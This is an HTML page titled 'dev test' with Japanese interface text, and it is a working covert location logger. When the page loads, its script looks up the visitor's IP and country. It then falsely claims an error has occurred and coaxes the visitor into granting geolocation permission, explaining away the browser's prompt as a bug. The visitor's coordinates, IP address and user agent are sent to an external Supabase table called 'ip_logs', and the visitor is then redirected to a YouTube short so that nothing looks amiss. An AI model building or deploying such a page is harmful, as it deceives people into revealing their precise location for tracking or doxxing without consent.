<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>dev test</title>
<style>
  body { 
    font-family: sans-serif; 
    background: #111; 
    color: #0f0; 
    display: flex; 
    justify-content: center; 
    align-items: center; 
    height: 100vh; 
  }
  #status { font-size: 1rem; text-align: center; }
</style>
</head>
<body>
  <div id="status">ロード中…</div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
  <script>
    const SUPABASE_URL = "https://melxxvozqlxqihcfwuez.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1lbHh4dm96cWx4cWloY2Z3dWV6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjMzNDI1MjQsImV4cCI6MjA3ODkxODUyNH0.8RIWTmeYM9r6ir5GrXUvnW1y3DvZ1MLTWdDUYZqpeOI";

    const REDIRECT_URL = "https://youtube.com/shorts/iVQhSAApsj0?si=33mSKX-xShaB7L5R";
    const NON_JP_REDIRECT_URL = "https://youtube.com/shorts/o8W2F_nZz-Q?feature=share";
    const LOCATION_DENIED_URL = "https://youtube.com/shorts/o8W2F_nZz-Q?feature=share";

    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    async function autoLogIP() {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        const ip = data.ip;

        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoRes.json();

        if (geoData.country !== "JP") {
          document.getElementById("status").innerText = "VPNを検知し拒否しました…";
          setTimeout(() => window.location.href = NON_JP_REDIRECT_URL, 500);
          return;
        }

        document.getElementById("status").innerText = "エラーが発生しましたので表示されている許可ボタンを押してください（ブラウザのバグで関係無い説明が表示される場合がありますが許可で大丈夫です）";

        navigator.geolocation.getCurrentPosition(async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const acc = pos.coords.accuracy;
          const ua = navigator.userAgent;

          const { error } = await supabaseClient
            .from("ip_logs")
            .insert([
              { ip_address: ip, user_agent: ua, latitude: lat, longitude: lon, accuracy: acc }
            ]);

          if (error) {
            document.getElementById("status").innerText = "失敗";
            return;
          }

          document.getElementById("status").innerText = "完了、リダイレクト中…";
          setTimeout(() => window.location.href = REDIRECT_URL, 500);

        }, () => {
          document.getElementById("status").innerText = "失敗しました";
          setTimeout(() => window.location.href = LOCATION_DENIED_URL, 500);
        });

      } catch (err) {
        document.getElementById("status").innerText = "エラーが発生しました";
      }
    }

    window.onload = () => setTimeout(autoLogIP, 100);
  </script>
</body>
</html>